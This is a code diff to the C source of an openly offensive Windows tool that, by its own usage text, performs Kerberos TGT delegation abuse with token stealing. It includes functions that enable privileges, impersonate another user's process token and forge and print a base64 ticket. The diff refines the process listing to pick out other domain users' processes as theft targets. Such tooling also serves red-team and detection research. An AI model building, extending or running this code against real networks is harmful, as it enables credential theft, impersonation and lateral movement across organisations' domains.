@@ -1,4 +1,3 @@
-
 #define SECURITY_WIN32
 
 #include <windows.h>
@@ -34,10 +33,6 @@ BOOL SetPrivilege(IN HANDLE hToken, IN LPCWSTR szPrivilegeName) {
     if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
         wprintf(L"[!] AdjustTokenPrivileges failed with error: %lu \n", GetLastError()); fflush(stdout);
         return FALSE;
-    }
-
-    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
-        wprintf(L"[-] Not all privileges referenced are assigned to the caller. This may be fine.\n"); fflush(stdout);
     }
 
     return TRUE;
@@ -107,7 +102,7 @@ _END_OF_FUNC:
 
 int forgeTGT(wchar_t* spn)
 {
-    int resultStatus = 1; // 1 = failure, 0 = success
+    int resultStatus = 1;
     CredHandle hCredential;
     TimeStamp tsExpiry;
     SECURITY_STATUS getHandle = AcquireCredentialsHandleW(NULL, (SEC_WCHAR*)MICROSOFT_KERBEROS_NAME_W, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hCredential, &tsExpiry);
@@ -201,7 +196,7 @@ int forgeTGT(wchar_t* spn)
                                                 size_t remaining = totalLen - (currentPos - base64String);
                                                 size_t lenToPrint = (remaining < chunkSize) ? remaining : chunkSize;
                                                 fwrite(currentPos, sizeof(char), lenToPrint, stdout);
-                                                fflush(stdout); 
+                                                fflush(stdout);
                                                 currentPos += lenToPrint;
                                             }
 
@@ -247,29 +242,47 @@ int forgeTGT(wchar_t* spn)
     return resultStatus;
 }
 
-
 BOOL ListProcesses() {
     HANDLE hSnap = INVALID_HANDLE_VALUE;
     PROCESSENTRY32W pe32;
     LPWSTR szCurrentUser = NULL;
     HANDLE hCurrentToken = NULL;
+    LPWSTR szDomainName = NULL;
+    NETSETUP_JOIN_STATUS joinStatus;
+
+    if (NetGetJoinInformation(NULL, &szDomainName, &joinStatus) != NERR_Success) {
+        wprintf(L"[-] Could not get domain join information. Error: %lu\n", GetLastError());
+        fflush(stdout);
+        return FALSE;
+    }
+
+    if (joinStatus != NetSetupDomainName) {
+        wprintf(L"[-] This machine is not joined to a domain!\n");
+        fflush(stdout);
+        NetApiBufferFree(szDomainName);
+        return FALSE;
+    }
+
+    //wprintf(L"[*] Machine is joined to domain: %s\n", szDomainName);
 
     hCurrentToken = GetCurrentToken();
     if (!hCurrentToken || !GetTokenUserW(hCurrentToken, &szCurrentUser)) {
         wprintf(L"[-] Could not get current user.\n"); fflush(stdout);
         if (hCurrentToken) CloseHandle(hCurrentToken);
+        NetApiBufferFree(szDomainName);
         return FALSE;
     }
     CloseHandle(hCurrentToken);
 
     wprintf(L"[*] Current User: %s\n", szCurrentUser); fflush(stdout);
-    wprintf(L"[*] Searching for processes belonging to other users...\n\n"); fflush(stdout);
+    wprintf(L"[*] Searching for processes belonging to other DOMAIN users...\n\n"); fflush(stdout);
     wprintf(L"%-6s | %-40s | %s\n", L"PID", L"User", L"Process Name"); fflush(stdout);
     wprintf(L"----------------------------------------------------------------------------\n"); fflush(stdout);
 
     hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE) {
         HeapFree(GetProcessHeap(), 0, szCurrentUser);
+        NetApiBufferFree(szDomainName);
         return FALSE;
     }
 
@@ -277,6 +290,7 @@ BOOL ListProcesses() {
     if (!Process32FirstW(hSnap, &pe32)) {
         CloseHandle(hSnap);
         HeapFree(GetProcessHeap(), 0, szCurrentUser);
+        NetApiBufferFree(szDomainName);
         return FALSE;
     }
 
@@ -288,7 +302,14 @@ BOOL ListProcesses() {
                 LPWSTR szProcessUser = NULL;
                 if (GetTokenUserW(hToken, &szProcessUser) && szProcessUser) {
                     if (_wcsicmp(szCurrentUser, szProcessUser) != 0) {
-                        wprintf(L"%-6lu | %-40s | %s\n", pe32.th32ProcessID, szProcessUser, pe32.szExeFile); fflush(stdout);
+                        wchar_t* separator = wcschr(szProcessUser, L'\\');
+                        if (separator) {
+                            size_t domainPartLength = separator - szProcessUser;
+                            if (_wcsnicmp(szProcessUser, szDomainName, domainPartLength) == 0 && wcslen(szDomainName) == domainPartLength) {
+                                wprintf(L"%-6lu | %-40s | %s\n", pe32.th32ProcessID, szProcessUser, pe32.szExeFile);
+                                fflush(stdout);
+                            }
+                        }
                     }
                     HeapFree(GetProcessHeap(), 0, szProcessUser);
                 }
@@ -300,8 +321,10 @@ BOOL ListProcesses() {
 
     CloseHandle(hSnap);
     HeapFree(GetProcessHeap(), 0, szCurrentUser);
+    NetApiBufferFree(szDomainName);
     return TRUE;
 }
+
 
 void StealAndDelegate(ULONG pid, wchar_t* domainnameArg, wchar_t* spnArg) {
     HANDLE hToken = NULL;
@@ -361,7 +384,7 @@ void PrintUsage(const wchar_t* progName) {
     wprintf(L"\nTool to perform TGT delegation abuse, with token stealing capabilities.\n\n");
     wprintf(L"Usage: %s <option> [arguments]\n\n", progName);
     wprintf(L"Options:\n");
-    wprintf(L"  /list\t\t\t\tLists processes not running as the current user.\n");
+    wprintf(L"  /list\t\t\t\tLists processes from other domain users.\n");
     wprintf(L"  /steal <PID> <domain> <spn>\tSteals token, impersonates, and runs tgtdelegation.\n\n");
     wprintf(L"  Example: %s /steal 6969 corp.local CIFS/dc01.corp.local\n", progName);
     fflush(stdout);
